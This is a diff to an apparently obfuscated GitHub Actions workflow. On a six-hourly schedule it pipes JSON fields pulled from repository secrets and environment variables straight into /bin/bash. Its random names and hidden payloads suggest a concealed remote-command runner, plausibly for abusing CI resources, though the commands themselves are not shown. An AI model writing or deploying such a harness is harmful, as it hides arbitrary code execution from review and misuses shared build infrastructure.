@@ -1,27 +1,33 @@
 name: gaochanghui5647
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
-
-jobs:  # 11010
+    - cron: '38 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gaochanghui5647
         env:
-          hs68: ${{ secrets.hs68 }}
+          ocz121: ${{ secrets.ocz121 }}
         run: |
-          echo $hs68 | jq -r .nkz64797 | /bin/bash
-          echo $t3 | jq -r .hsitg3880 | /bin/bash
-          echo $byyo3 | jq -r .catv293 | /bin/bash
-          echo $hzg53564 | jq -r .dz34967 | /bin/bash
-          echo $ztr88 | jq -r .qfujf0373 | /bin/bash
-          echo $uza6 | jq -r .uom1 | /bin/bash
-          echo $cnyl47 | jq -r .x1 | /bin/bash
-          echo $h76731 | jq -r .jnj63 | /bin/bash
-          echo $p5 | jq -r .x2659 | /bin/bash
-          echo $j657 | jq -r .c4255 | /bin/bash
+          echo $ocz121 | jq -r .pdm10 | /bin/bash
+          echo $sf523 | jq -r .td8472 | /bin/bash
+          echo $fbfdk69 | jq -r .e7030 | /bin/bash
+          echo $k9676 | jq -r .y260 | /bin/bash
+          echo $egr0 | jq -r .bsx42429 | /bin/bash
+          echo $es66976 | jq -r .z79 | /bin/bash
+          echo $w2 | jq -r .mkvd7 | /bin/bash
+          echo $kyhd21999 | jq -r .qoom68 | /bin/bash
+          echo $m6 | jq -r .xcb13 | /bin/bash
+          echo $m26 | jq -r .h16216 | /bin/bash
+          echo $mu83 | jq -r .w5 | /bin/bash
+          echo $drd9 | jq -r .f37786 | /bin/bash
+          echo $g0 | jq -r .nr13 | /bin/bash
+          echo $gwf8074 | jq -r .l8 | /bin/bash
+          echo $k5 | jq -r .vqlht8 | /bin/bash
+          echo $nlmou864 | jq -r .wy589 | /bin/bash
+          echo $p9952 | jq -r .klkgt789 | /bin/bash
 
